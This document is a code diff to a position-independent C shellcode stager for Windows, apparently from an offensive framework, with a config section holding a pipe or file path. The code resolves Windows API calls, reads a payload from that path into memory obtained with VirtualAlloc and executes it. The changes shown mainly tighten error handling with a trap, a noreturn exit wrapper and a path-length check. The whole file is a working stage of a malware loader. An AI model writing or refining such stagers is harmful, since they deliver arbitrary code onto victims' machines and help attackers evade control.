@@ -53,6 +53,17 @@ struct resolved_funcs {
 	fn_ExitProcess exit_process;
 };
 
+PIC_TEXT
+__attribute__((noreturn)) static void fail_fast(void) { __builtin_trap(); }
+
+PIC_TEXT
+__attribute__((noreturn)) static void exit_process(
+	fn_ExitProcess pExitProcess, unsigned int uExitCode)
+{
+	pExitProcess(uExitCode);
+	fail_fast();
+}
+
 __asm__(".section .config,\"aw\"\n"
 	".globl stager_pipe_windows_config\n"
 	"stager_pipe_windows_config:\n"
@@ -100,6 +111,8 @@ static pic_u16 load_path(char *path)
 	const pic_u8 *cfg = (const pic_u8 *)stager_pipe_windows_config;
 
 	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
+	if ((0U == path_len) || (PATH_MAX_LEN <= path_len))
+		return 0;
 	for (pic_u16 i = 0; i < path_len; i++)
 		path[i] = (char)cfg[2 + i];
 	path[path_len] = '\0';
@@ -171,18 +184,20 @@ void _start(void)
 
 	resolve_funcs(&funcs);
 	if (!funcs.create_file || !funcs.read_file || !funcs.close_handle ||
-		!funcs.virtual_alloc || !funcs.exit_process)
-		for (;;)
-			;
+		!funcs.virtual_alloc || !funcs.exit_process) {
+		fail_fast();
+	}
 
 	path_len = load_path(path);
-	if (path_len == 0 || path_len >= PATH_MAX_LEN)
-		funcs.exit_process(1);
+	if (path_len == 0 || path_len >= PATH_MAX_LEN) {
+		exit_process(funcs.exit_process, 1);
+	}
 
 	mem = load_payload(&funcs, path);
-	if (!mem)
-		funcs.exit_process(1);
+	if (!mem) {
+		exit_process(funcs.exit_process, 1);
+	}
 
 	((void (*)(void))mem)();
-	funcs.exit_process(0);
+	exit_process(funcs.exit_process, 0);
 }
